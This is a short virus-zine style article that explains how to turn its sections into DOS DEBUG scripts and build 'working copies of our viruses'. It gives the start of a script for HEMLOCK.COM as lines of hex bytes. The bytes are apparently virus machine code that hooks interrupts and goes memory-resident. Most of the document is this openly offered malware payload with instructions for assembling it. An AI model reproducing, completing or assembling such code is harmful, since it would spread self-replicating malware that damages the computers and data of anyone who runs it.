
  Debug Scripts!
  +------------+

  To get a working copy of our viruses, cut this article up, and rename
  the various sections according to the name of the file they will create
  but adding the extension .SCR.
  
  From there, to create the viruses go:  DEBUG < filename.SCR

  
  For example:
   below should become 'hemlock.scr'
   debug < hemlock.scr

  Simple!

+-------------------- Cut Here --------------------------------------+

 N HEMLOCK.COM
 E 0100 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
 E 0115 90 90 90 BE 56 0D 81 EE 56 0C FC B8 BE EF B3 09 CD 13 3D EF BE
 E 012A 74 72 2E 01 84 34 00 EB 00 E9 48 FE B8 00 4C CD 21 20 2E 29 44
 E 013F 34 E8 D5 08 74 09 E8 F2 08 E8 70 09 E8 C6 09 1E 8C C0 48 33 FF
 E 0154 8E D8 80 3D 5A 75 42 81 6D 03 95 01 81 6D 12 95 01 8B 45 12 8E
 E 0169 C0 0E 1F B9 6F 0C F3 A4 2B F7 56 8E D9 BE 84 00 BF 15 05 A5 A5
 E 017E C7 44 FC 12 01 8C 44 FE BE 4C 00 BF 8A 06 A5 A5 C7 44 FC B8 05
 E 0193 8C 44 FE 26 C6 06 4F 0C 01 5E 1F 1E 07 2E 80 BC 52 0C 45 74 0E
 E 01A8 BF 00 01 57 81 C6 57 0C B9 18 00 F3 A4 C3 8C D8 05 10 00 2E 01
 E 01BD 84 D9 00 FA 2E 8B A4 67 0C 2E 03 84 65 0C 8E D0 FB 33 C0 33 DB
 E 01D2 33 F6 EB 00 EA 00 00 00 00 55 55 89 E5 56 50 BE 00 00 2E 8B 84
 E 01E7 10 01 89 46 02 2E A3 06 00 53 B8 BE EF 33 DB CD 13 5B 3D EF BE
 E 01FC 74 0E E8 17 08 74 09 E8 34 08 E8 B2 08 E8 08 09 58 5E 5D C3 00
 E 0211 00 E8 E4 07 56 50 BE 32 01 FC 81 FE 53 01 74 0E 2E AC 3A E0 74
 E 0226 04 46 46 EB F0 2E AD FF E0 E9 E0 03 11 9D 02 12 9D 02 3D 1F 02
 E 023B 3F 53 01 43 58 02 4B 58 02 4E DF 02 4F DF 02 56 58 02 57 7D 02
 E 0250 6C 1F 02 58 5E 2E 80 3E 51 0C 00 74 05 E8 87 07 73 03 E9 AF 03
 E 0265 06 57 E8 75 06 72 05 E8 6A 06 73 07 5F 07 E9 9E 03 00 00 26 83
 E 027A 7D 17 00 75 F2 26 83 7D 15 18 73 EB 26 FF 75 15 2E 8F 06 76 01
